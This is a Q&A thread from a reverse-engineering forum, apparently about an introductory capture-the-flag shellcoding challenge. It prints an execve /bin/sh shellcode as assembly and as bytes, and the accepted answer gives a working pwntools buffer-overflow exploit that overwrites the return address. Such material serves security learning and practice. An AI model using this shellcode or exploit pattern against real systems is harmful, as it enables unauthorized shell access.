{
    "title": "Shellcode challenge - shellcode works in test program, segfaults in actual binary",
    "link": "https://reverseengineering.stackexchange.com/questions/18492/shellcode-challenge-shellcode-works-in-test-program-segfaults-in-actual-binar",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  Currently working through an introductory shellcoding challenge, and having trouble getting the shellcode to work consistently.\n </p>\n <p>\n  I'm working on a 32bit Linux binary. I found this shellcode:\n </p>\n <p>\n  <a href=\"http://shell-storm.org/shellcode/files/shellcode-827.php\" rel=\"noreferrer\">\n   http://shell-storm.org/shellcode/files/shellcode-827.php\n  </a>\n </p>\n <pre><code>xor    %eax,%eax\npush   %eax\npush   $0x68732f2f\npush   $0x6e69622f\nmov    %esp,%ebx\npush   %eax\npush   %ebx\nmov    %esp,%ecx\nmov    $0xb,%al\nint    $0x80\n</code></pre>\n <p>\n  As a first step, I ran the shellcode in a simple test program:\n </p>\n <pre><code>#include<stdio.h>\n#include<string.h>\n\nunsigned char code[] = \\ \n\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\"\n\"\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";\n\nmain()\n{\n    printf(\"Shellcode length: %d\n\", strlen(code));\n    int (*ret)() = (int(*)())code;\n    ret();\n}\n</code></pre>\n <p>\n  Shellcode works perfectly in this test program. Problems start when I move the shellcode into the actual challenge binary. I can confirm in GDB that:\n </p>\n <ol>\n  <li>\n   Code execution is re-directed into the stack.\n  </li>\n  <li>\n   The shellcode assembly is correct in the stack.\n  </li>\n </ol>\n <p>\n  However, when program execution gets to one of these two lines in the shellcode:\n </p>\n <pre><code>0xffffd0e4:    push       %ebx\n0xffffd0e5:    mov        %esp,%ecx\n</code></pre>\n <p>\n  I get:\n </p>\n <pre><code>SIGSEGV, Segmentation fault\n</code></pre>\n <p>\n  My question is: why does shellcode that works in a test program fail in the actual binary? How would I go about troubleshooting this?\n </p>\n <p>\n  Thank you!\n </p>\n</div>\n</body></html>",
    "votes": "7",
    "answers": 1,
    "views": "1k",
    "tags": [
        "shellcode"
    ],
    "user": "BronzeOtter",
    "time": "Jun 9, 2018 at 17:18",
    "comments": [
        {
            "user": "Paweł Łukasik",
            "text": "<html><body><span class=\"comment-copy\">\n Can you share the binary?\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "Megabeets",
            "text": "<html><body><span class=\"comment-copy\">\n Is the stack of the binary is executable? We won't be able to tell you the exact problem without the binary itself.\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "BronzeOtter",
            "text": "<html><body><span class=\"comment-copy\">\n @PawełŁukasik Thank you so much for taking a look. Here is a link to the binary:\n <a href=\"https://wetransfer.com/downloads/df24ecc7a3889e062e88bb4a803e270020180610220305/d2c9cea8e3ea65ea48aabced77df9c6e20180610220305/09069b\" rel=\"nofollow noreferrer\">\n  wetransfer.com/downloads/…\n </a>\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "BronzeOtter",
            "text": "<html><body><span class=\"comment-copy\">\n @MegabeetsThank you! Just shared the binary in the link above.\n</span>\n</body></html>",
            "time": null
        },
        {
            "user": "Paweł Łukasik",
            "text": "<html><body><span class=\"comment-copy\">\n I've pwn this bin using your shellcode and see no issues. Can you post the code that does the code execution redirection?\n</span>\n</body></html>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  It looks like you have two issues.\n </p>\n <p>\n  1) You are overwriting your input buffer with those\n  <code>\n   push\n  </code>\n  -es so that why you have some junk on the stack and that's why our application crashes.\n </p>\n <p>\n  See those two pictures that show your assembly before and after executing the second push for the /bin/sh\n </p>\n <p>\n  Before\n  <a href=\"https://i.sstatic.net/0N176.png\" rel=\"nofollow noreferrer\">\n   <img alt=\"enter image description here\" src=\"https://i.sstatic.net/0N176.png\"/>\n  </a>\n </p>\n <p>\n  After\n  <a href=\"https://i.sstatic.net/EOcBK.png\" rel=\"nofollow noreferrer\">\n   <img alt=\"enter image description here\" src=\"https://i.sstatic.net/EOcBK.png\"/>\n  </a>\n </p>\n <p>\n  You can clearly see odd\n  <code>\n   das\n  </code>\n  and\n  <code>\n   bound\n  </code>\n  opcodes instead of\n  <code>\n   push\n  </code>\n  es.\n </p>\n <p>\n  2) You're not taking into account that the code is relocated so your buffer is not always in the same place. When you run from\n  <code>\n   gdb\n  </code>\n  you have the code that will jump to the beginning of the buffer (this is the part\n  <code>\n   \\xc0\\xd0\\xff\\xff\n  </code>\n  ) and for your\n  <code>\n   gdb\n  </code>\n  sessions, this is true since\n  <code>\n   gdb\n  </code>\n  turns\n  <a href=\"https://en.wikipedia.org/wiki/Address_space_layout_randomization\" rel=\"nofollow noreferrer\">\n   ASLR\n  </a>\n  off.\n </p>\n <p>\n  You can check that by issuing this command in\n  <code>\n   gdb\n  </code>\n  :\n </p>\n <blockquote>\n  <p>\n   gdb-peda$ show disable-randomization\n   \n\n   Disabling randomization of debuggee's virtual address space is on.\n  </p>\n </blockquote>\n <p>\n  If you change that by\n  <code>\n   set disable-randomization off\n  </code>\n  it should start failing also in\n  <code>\n   gdb\n  </code>\n  as the buffer will be located each time at a different location.\n </p>\n <p>\n  In order to do this correctly, you need to locate where the buffer is. This is also why you have a tip where it is located in the first message.\n </p>\n <p>\n  To compensate for that two issues I would use\n  <a href=\"https://github.com/Gallopsled/pwntools#readme\" rel=\"nofollow noreferrer\">\n   pwntools\n  </a>\n  for this and prepare a script:\n </p>\n <pre><code>from pwn import *\n\ncontext(arch='i386', os='linux')\n\nr = process('./shellcoding.dms')\n# read the line that has the info about the address\nl = r.recvline()\nprint l\n# extract it\naddr = int(l[18:], 16)\n#nop sled at the end but not actually needed. We only need to fill the space for the buffer to overwrite the ret\nexploit = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"+\"\\x90\"*21 \nprint \"Address is: \"+hex(addr)\n# add an address to be taken from the stack by ret\nexploit += p32(addr) \n\nr.send(exploit+\"\n\")\n# read the \"ok... lets see if you got it...\" message\nr.recvline()\nr.interactive() #pwn\n</code></pre>\n <p>\n  Running this should work!\n </p>\n</div>\n</body></html>",
            "votes": "9",
            "user": "NirIzr",
            "time": "Jun 12, 2018 at 5:35",
            "is_accepted": true,
            "comments": [
                {
                    "user": "BronzeOtter",
                    "text": "<span class=\"comment-copy\">Awesome. Thank you, once again, for generously taking the time to help. I had no idea that having the NOPs after the shellcode vs. before the shellcode would have such a big effect. Pwntool code was also great. Was not aware of the p32() functionality, which is very helpful. On to the next one!</span>",
                    "time": null
                }
            ]
        }
    ]
}